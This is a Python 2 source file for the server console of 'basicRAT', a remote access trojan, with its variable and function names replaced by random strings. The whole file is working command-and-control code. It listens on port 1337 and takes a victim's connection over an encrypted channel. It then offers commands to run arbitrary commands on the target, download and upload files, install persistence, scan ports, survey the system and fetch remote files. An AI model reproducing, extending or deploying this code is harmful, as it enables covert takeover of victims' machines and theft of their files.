#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import zcqgzrNhhMMrepGKrXzOYcYeaRymVspf,gcbCoqAgZztElhuzHlCRVsaXiDmrxjeQ,ZHmaXjmaptcjOuQWzIYmNcRFyCaggAdR
    from core.filesock import uBnCzheoKMvSEYNltgSkBmyfdIkCfmLO, OLxWjqoEVTGyIdmtAzGMiyvWpgJuSYVT
except ImportError as MppCVHitpvMJlRKDneMmcrbqSXgRGxkd:
    print MppCVHitpvMJlRKDneMmcrbqSXgRGxkd
    sys.exit(0)
zchjEckYBzoFuxhrgoyFHBMRzxwnDDKQ = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
dFOYyOelYGcUbznvlEUcgeCWJChmherg = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
KggPZnUqnowRGyxMbumwUOTYOQIVzDNr = [
            'download', 'help', 'persistence', 'quit', 'rekey',
            'run', 'scan', 'survey', 'unzip', 'upload', 'wget'
]
def sgqNknjXtXoXwwoSpCgZsGYfdXIihrmi():
    pcwSSaMtkiFlNqACwuhCuyuZfZhsgVXZ = argparse.ArgumentParser(description='basicRAT server')
    pcwSSaMtkiFlNqACwuhCuyuZfZhsgVXZ.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return pcwSSaMtkiFlNqACwuhCuyuZfZhsgVXZ
def iLiYzUOEZhisIVzOJGrTCuPtFectnKci():
    pcwSSaMtkiFlNqACwuhCuyuZfZhsgVXZ  = sgqNknjXtXoXwwoSpCgZsGYfdXIihrmi()
    JuXXaLGcQkCkGebdPvAyKrQtFJelnXnl    = vars(pcwSSaMtkiFlNqACwuhCuyuZfZhsgVXZ.parse_args())
    iawcVAMDepMkxUJqMiDaPxXcGYDDTDvK    = JuXXaLGcQkCkGebdPvAyKrQtFJelnXnl['port']
    OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp.bind(('0.0.0.0', iawcVAMDepMkxUJqMiDaPxXcGYDDTDvK))
    except socket.error:
        print 'Error: Unable to start server, iawcVAMDepMkxUJqMiDaPxXcGYDDTDvK {} in use?'.format(iawcVAMDepMkxUJqMiDaPxXcGYDDTDvK)
        sys.exit(1)
    for BWzkPPgYbyCZYVRigcUIvnYpIrXiWVpf in dFOYyOelYGcUbznvlEUcgeCWJChmherg.split('\n'):
        time.sleep(0.05)
        print BWzkPPgYbyCZYVRigcUIvnYpIrXiWVpf
    print 'basicRAT server listening on iawcVAMDepMkxUJqMiDaPxXcGYDDTDvK {}...'.format(iawcVAMDepMkxUJqMiDaPxXcGYDDTDvK)
    OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp.listen(10)
    SUDRVecRAPpOWSsSksuSEfwkvIDajgPL, PDewjvczCqnWeTCvCYDDBfdEqkFawFcT = OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp.accept()
    XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk = ZHmaXjmaptcjOuQWzIYmNcRFyCaggAdR(SUDRVecRAPpOWSsSksuSEfwkvIDajgPL, server=True)
    while True:
        njGYCBGkdosJuOLNSAHLSKtTDXyeKamz = raw_input('\n[{}] basicRAT> '.format(PDewjvczCqnWeTCvCYDDBfdEqkFawFcT[0])).rstrip()
        if not njGYCBGkdosJuOLNSAHLSKtTDXyeKamz:
            continue
        MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq, _, action = njGYCBGkdosJuOLNSAHLSKtTDXyeKamz.partition(' ')
        if MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq not in KggPZnUqnowRGyxMbumwUOTYOQIVzDNr:
            print 'Invalid command, type "help" to see adrCPWbaRPWXrGfZTxfXAtVEFHttGCMF list of commands.'
            continue
        if MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'help':
            print zchjEckYBzoFuxhrgoyFHBMRzxwnDDKQ
            continue
        SUDRVecRAPpOWSsSksuSEfwkvIDajgPL.send(gcbCoqAgZztElhuzHlCRVsaXiDmrxjeQ(njGYCBGkdosJuOLNSAHLSKtTDXyeKamz, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk))
        if MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'quit':
            OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp.close()
            sys.exit(0)
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'run':
            LDkMKWzmYmufSMwSSgSJIYFiPSWfBTkg = SUDRVecRAPpOWSsSksuSEfwkvIDajgPL.recv(4096)
            print zcqgzrNhhMMrepGKrXzOYcYeaRymVspf(LDkMKWzmYmufSMwSSgSJIYFiPSWfBTkg, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk).rstrip()
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'download':
            for wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf in action.split():
                wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf = wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf.strip()
                uBnCzheoKMvSEYNltgSkBmyfdIkCfmLO(SUDRVecRAPpOWSsSksuSEfwkvIDajgPL, wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk)
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'upload':
            for wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf in action.split():
                wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf = wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf.strip()
                OLxWjqoEVTGyIdmtAzGMiyvWpgJuSYVT(SUDRVecRAPpOWSsSksuSEfwkvIDajgPL, wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk)
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'rekey':
            XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk = ZHmaXjmaptcjOuQWzIYmNcRFyCaggAdR(SUDRVecRAPpOWSsSksuSEfwkvIDajgPL, server=True)
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq)
            LDkMKWzmYmufSMwSSgSJIYFiPSWfBTkg = SUDRVecRAPpOWSsSksuSEfwkvIDajgPL.recv(1024)
            print zcqgzrNhhMMrepGKrXzOYcYeaRymVspf(LDkMKWzmYmufSMwSSgSJIYFiPSWfBTkg, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk)
if __name__ == '__main__':
    iLiYzUOEZhisIVzOJGrTCuPtFectnKci()
